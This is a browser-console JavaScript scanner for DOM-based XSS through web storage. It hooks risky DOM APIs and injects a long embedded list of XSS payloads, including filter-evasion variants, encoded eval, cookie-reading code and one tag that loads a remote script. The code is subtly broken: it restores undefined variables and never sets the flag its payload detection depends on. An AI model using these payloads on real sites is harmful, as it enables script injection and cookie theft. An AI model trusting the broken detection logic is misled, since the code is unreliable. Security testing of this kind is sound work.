console.log("=== Starting Full Automated Advanced Storage DOM XSS Test (Enhanced) ===");

// This script is designed to be run directly in the browser's developer console.
// It tests for DOM-based XSS vulnerabilities originating from localStorage and sessionStorage.

(async function() {
    // Analyze CSP and security headers
    function analyzeSecurityHeaders() {
        const metaCSP = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
        let csp = '';
        if (metaCSP) {
            csp = metaCSP.getAttribute('content') || '';
        } else {
            // Try to get CSP from response headers (only available if running in extension or with server-side help)
            csp = 'Not available (meta tag not found)';
        }
        let issues = [];
        if (!csp || csp === 'Not available (meta tag not found)') {
            issues.push('Missing Content-Security-Policy');
        } else {
            if (/unsafe-inline|unsafe-eval/.test(csp)) {
                issues.push('CSP allows unsafe-inline or unsafe-eval');
            }
            if (!/script-src/.test(csp)) {
                issues.push('CSP missing script-src directive');
            }
        }
        // Check other headers via meta tags (limited in browser)
        const metaXFO = document.querySelector('meta[http-equiv="X-Frame-Options"]');
        if (!metaXFO) {
            issues.push('Missing X-Frame-Options');
        }
        const metaXXSS = document.querySelector('meta[http-equiv="X-XSS-Protection"]');
        if (!metaXXSS) {
            issues.push('Missing X-XSS-Protection');
        }
        if (issues.length > 0) {
            console.warn('Security header issues detected:', issues);
        } else {
            console.log('No obvious security header issues detected.');
        }
        return issues;
    }
    // Stores which storage type and key are being tested.
    let currentTest = { storage: '', key: '' };
    const storageSources = ['sessionStorage', 'localStorage'];
    const report = [];
    let allPayloads = [];

    // Save original storage values to restore them later.
    const originalStorage = {};
    storageSources.forEach(src => {
        originalStorage[src] = {};
        try {
            for (let i = 0; i < window[src].length; i++) {
                const key = window[src].key(i);
                originalStorage[src][key] = window[src].getItem(key);
            }
        } catch (e) {
            console.error(`Error accessing ${src}:`, e);
        }
    });

    // Hook risky DOM APIs to detect unsafe rendering.
    // This allows us to log when an API is called with user-controlled data.
    const originalAPIs = {
        write: document.write,
        insertAdjacentHTML: Element.prototype.insertAdjacentHTML,
        innerHTML: Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set,
        outerHTML: Object.getOwnPropertyDescriptor(Element.prototype, 'outerHTML').set,
        eval: window.eval,
        setTimeout: window.setTimeout,
        setInterval: window.setInterval,
    };

    function addApiTrigger(api, content, tag = null) {
        report.push({
            storage: currentTest.storage,
            key: currentTest.key,
            vulnerabilityType: 'Unsafe API Usage', // Explicitly state the type of vulnerability
            payload: 'N/A',
            triggeredAPI: api,
            content: content,
            stack: (new Error()).stack,
        });
        console.warn(`⚠️ Risky API call detected: ${api} on <${tag || 'document'}> with content:`, content);
    }

    document.write = function(content) {
        addApiTrigger('document.write', content);
        return originalAPIs.write.apply(this, arguments);
    };

    Element.prototype.insertAdjacentHTML = function(pos, content) {
        addApiTrigger('insertAdjacentHTML', content, this.tagName);
        return originalAPIs.insertAdjacentHTML.apply(this, arguments);
    };

    Object.defineProperty(Element.prototype, 'outerHTML', {
        set: function(value) {
            addApiTrigger('outerHTML', value, this.tagName);
            return originalAPIs.outerHTML.apply(this, [value]);
        },
    });

    Object.defineProperty(Element.prototype, 'innerHTML', {
        set: function(value) {
            addApiTrigger('innerHTML', value, this.tagName);
            return originalAPIs.innerHTML.apply(this, [value]);
        },
    });

    // Hook `eval` to detect dynamic code execution.
    window.eval = function(code) {
        addApiTrigger('eval', code);
        return originalAPIs.eval.apply(this, arguments);
    };

    // Hook `setTimeout` and `setInterval` to detect code execution from string arguments.
    window.setTimeout = function(callback, time) {
        if (typeof callback === 'string') {
            addApiTrigger('setTimeout', callback);
        }
        return originalAPIs.setTimeout.apply(this, arguments);
    };

    window.setInterval = function(callback, time) {
        if (typeof callback === 'string') {
            addApiTrigger('setInterval', callback);
        }
        return originalAPIs.setInterval.apply(this, arguments);
    };

    // Embed all payloads from paylod.txt directly
    function loadPayloads() {
        const builtInPayloads = [
            `<img src=x onerror=alert(1)>`,
            `<svg/onload=alert(1)>`,
            `<iframe src="javascript:alert(1)">`,
            `"><img src=x onerror=prompt(1);>`,
            `+123'];alert(1);[['`,
            `123',alert(1),'`,
            `123",term:alert(1)//"`,
            `123";alert\`1\`;//`,
            `<script>alert(1)</script>`,
            `<input onfocus=alert(1) autofocus>`,
            `<details ontoggle=alert\`xss\`><summary>Click me</summary></details>`,
            `<whatever/onpointerover='var a=alert;a(1)'>`,
            `<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js'>`,
            `<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>`,
            `<img src=x onerror="var pop='ALERT(document.cookie);'; eval(pop.toLowerCase());">`,
            `<a href="javascript:alert(document.domain)">XSS</a>`,
            `<body onpageshow=alert(1)>`,
            `<object data="javascript:alert(1)">`,
            `<audio src=x onerror=alert(1)>`,
            `<video src=x onerror=alert(1)>`,
            `<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>XSS</a>`,
            `javascript:alert(1)`,
            `"><style>@keyframes x{}</style><div style="animation:x;" onanimationstart="alert(1)">`,
            `"><img src=x onmouseover=alert(1)>`,
        ];
        // All payloads from paylod.txt (fully embedded)
        const paylodPayloads = [
            "-prompt(8)-",
            "'-prompt(8)-'",
            '";a=prompt,a()//',
            "';a=prompt,a()//",
            "'-eval(\"window['pro'%2B'mpt'](8)\")-'",
            '"-eval(\"window[\'pro\'%2B\'mpt\'](8)\")-"',
            '"onclick=prompt(8)>"@x.y',
            '"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y',
            '<image/src/onerror=prompt(8)>',
            '<img/src/onerror=prompt(8)>',
            '<image src/onerror=prompt(8)>',
            '<img src/onerror=prompt(8)>',
            '<image src =q onerror=prompt(8)>',
            '<img src =q onerror=prompt(8)>',
            '</scrip</script>t><img src =q onerror=prompt(8)>',
            '<script\x20type="text/javascript">javascript:alert(1);</script>',
            '<script\x3Etype="text/javascript">javascript:alert(1);</script>',
            '<script\x0Dtype="text/javascript">javascript:alert(1);</script>',
            '<script\x09type="text/javascript">javascript:alert(1);</script>',
            '<script\x0Ctype="text/javascript">javascript:alert(1);</script>',
            '<script\x2Ftype="text/javascript">javascript:alert(1);</script>',
            '<script\x0Atype="text/javascript">javascript:alert(1);</script>',
            "'`\"><\\x3Cscript>javascript:alert(1)</script>        ",
            "'`\"><\\x00script>javascript:alert(1)</script>",
            '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
            '<audio src=1 href=1 onerror="javascript:alert(1)"></audio>',
            '<video src=1 href=1 onerror="javascript:alert(1)"></video>',
            '<body src=1 href=1 onerror="javascript:alert(1)"></body>',
            '<image src=1 href=1 onerror="javascript:alert(1)"></image>',
            '<object src=1 href=1 onerror="javascript:alert(1)"></object>',
            '<script src=1 href=1 onerror="javascript:alert(1)"></script>',
            '<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>',
            '<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>',
            '<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>',
            '<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>',
            '<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>',
            '<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>',
            '<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>',
            '<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>',
            '<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>',
            '<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>',
            '<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>',
            '<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>',
            '<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>',
            '<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>',
            '<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>',
            '<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>',
            '<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>',
            '<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>',
            '<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>',
            '<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>',
            '<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>',
            '<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>',
            '<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>',
            '<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>',
            '<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>',
            '<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>',
            '<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>',
            '<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>',
            '<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>',
            '<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>',
            '<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>',
            '<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>',
            '<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>',
            '<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>',
            '<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>',
            '<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>',
            '<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>',
            '<object onError object onError="javascript:javascript:alert(1)"></object onError>',
            '<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>',
            '<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>',
            '<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>',
            '<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>',
            '<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>',
            '<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>',
            '<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>',
            '<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>',
            '<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>',
            '<body onload body onload="javascript:javascript:alert(1)"></body onload>',
            '<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>',
            '<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>',
            '<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>',
            '<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>',
            '<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>',
            '<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>',
            '<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>',
            '<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>',
            '<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>',
            '<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>',
            '\x3Cscript>javascript:alert(1)</script>',
            '\'"`><script>/* *\x2Fjavascript:alert(1)// */</script>',
            '<script>javascript:alert(1)</script\x0D',
            '<script>javascript:alert(1)</script\x0A',
            '<script>javascript:alert(1)</script\x0B',
            '<script charset="\x22>javascript:alert(1)</script>',
            '<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->',
            '--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->',
            '--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->',
            '--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->',
            '--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->',
            '`"\'><img src=\'#\x27 onerror=javascript:alert(1)>',
            '<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>',
        ];
        let externalPayloads = [];
        // Concatenate all payloads
        allPayloads = [...builtInPayloads, ...paylodPayloads, ...externalPayloads];
    }

    // Obfuscate/encode payloads
    function obfuscatePayload(payload, method) {
        switch (method) {
            case 'base64':
                try {
                    return btoa(payload);
                } catch (e) {
                    return '';
                }
            case 'url':
                return encodeURIComponent(payload);
            case 'unicode':
                return payload.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
            case 'whitespace':
                return payload.split('').join(' ');
            case 'upper':
                return payload.toUpperCase();
            case 'lower':
                return payload.toLowerCase();
            default:
                return payload;
        }
    }

    async function testKey(storageType, key, value) {
        console.log(`Testing ${storageType} key: "${key}"`);
        const tempDiv = document.createElement('div');
        tempDiv.style.display = 'none';
        document.body.appendChild(tempDiv);

        let executedPayloadTrigger = null;
        // Do NOT override alert and prompt; allow real popups to trigger for XSS detection

        // Contextual injection: test payloads in different HTML contexts
        const contexts = [
            // Attribute context
            (payload, value) => `<img src='x' onerror='${payload}'>${value}`,
            // Tag content context
            (payload, value) => `<div>${payload}${value}</div>`,
            // Script block context
            (payload, value) => `<script>${payload}${value}</script>`,
            // URL context
            (payload, value) => `<a href='${payload}'>${value}</a>`
        ];

        for (const payload of allPayloads) {
            for (const method of ['none', 'base64', 'url', 'unicode', 'whitespace', 'upper', 'lower']) {
                let mutatedPayload = method === 'none' ? payload : obfuscatePayload(payload, method);
                if (!mutatedPayload) continue;

                for (const contextFn of contexts) {
                    executedPayloadTrigger = null;
                    let injected = contextFn(mutatedPayload, value);
                    try {
                        tempDiv.innerHTML = injected;
                        await new Promise(r => setTimeout(r, 50));
                    } catch (e) {
                        // This can happen with malformed HTML payloads, which is expected.
                    }

                    if (executedPayloadTrigger) {
                        report.push({
                            storage: storageType,
                            key: key,
                            originalValue: value,
                            vulnerabilityType: 'Payload Execution',
                            payload: payload,
                            encoding: method,
                            injected: injected,
                            triggeredAPI: executedPayloadTrigger,
                            context: contextFn.name || 'anonymous',
                        });
                        break;
                    }
                }
                if (executedPayloadTrigger) break;
            }
            if (executedPayloadTrigger) break;
        }

        // Clean up and restore.
        if (tempDiv.parentNode) {
            tempDiv.parentNode.removeChild(tempDiv);
        }
        window.alert = originalAlert;
        window.prompt = originalPrompt;
    }

    // Run the tests on all stored items
    async function runTests() {
    loadPayloads();
    // Analyze CSP and security headers before running tests
    const headerIssues = analyzeSecurityHeaders();
        let keysTested = 0;
        let vulnerabilitiesFound = 0;
        let filteredReport = [];

        for (const storageType of storageSources) {
            try {
                const keys = Object.keys(originalStorage[storageType]);
                console.log(`\n--- Scanning ${storageType} (${keys.length} items) ---`);

                for (const key of keys) {
                    const value = originalStorage[storageType][key];
                    if (value && typeof value === 'string') { // Only test string values
                        currentTest = { storage: storageType, key: key };
                        keysTested++;
                        const initialReportLength = report.length;
                        await testKey(storageType, key, value);
                        if (report.length > initialReportLength) {
                            vulnerabilitiesFound++;
                        }
                    }
                }
            } catch (e) {
                console.error(`Error processing ${storageType}:`, e);
            }
        }

        // False positive filtering: highlight true vulnerabilities
        // Remove duplicate findings and filter out low-confidence results
        const seen = new Set();
        for (const finding of report) {
            const key = `${finding.storage}|${finding.key}|${finding.vulnerabilityType}|${finding.payload}|${finding.encoding}|${finding.context}`;
            if (!seen.has(key) && finding.triggeredAPI && finding.vulnerabilityType === 'Payload Execution') {
                filteredReport.push(finding);
                seen.add(key);
            }
        }
        
        // Restore original APIs.
        document.write = originalAPIs.write;
        Element.prototype.insertAdjacentHTML = originalAPIs.insertAdjacentHTML;
        Object.defineProperty(Element.prototype, 'outerHTML', { set: originalAPIs.outerHTML });
        Object.defineProperty(Element.prototype, 'innerHTML', { set: originalAPIs.innerHTML });
        window.eval = originalAPIs.eval;
        window.setTimeout = originalAPIs.setTimeout;
        window.setInterval = originalAPIs.setInterval;
        
        console.log("\n=== Test Completed ===");
        console.log(`Summary: ${keysTested} keys tested, ${vulnerabilitiesFound} potential vulnerabilities found.`);

        if (report.length === 0) {
            console.log("✅ No unsafe DOM rendering or payload execution detected.");
        } else {
            console.warn("Findings detected! See full report below.");
            console.table(report);
            // Download full report as JSON
            const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `xss_report_${Date.now()}.json`;
            a.textContent = 'Download XSS Report';
            a.style.display = 'block';
            a.style.padding = '10px';
            a.style.backgroundColor = '#007bff';
            a.style.color = 'white';
            a.style.textAlign = 'center';
            a.style.textDecoration = 'none';
            a.style.borderRadius = '5px';
            document.body.appendChild(a);
            // The report will be downloaded automatically by the script.
            a.click();
            setTimeout(() => {
                if(a.parentNode) {
                    a.parentNode.removeChild(a);
                }
                URL.revokeObjectURL(url);
            }, 3000);
        }
    }
    
    // Start the test after a brief delay to let the page fully load
    setTimeout(runTests, 1000);
    
})();
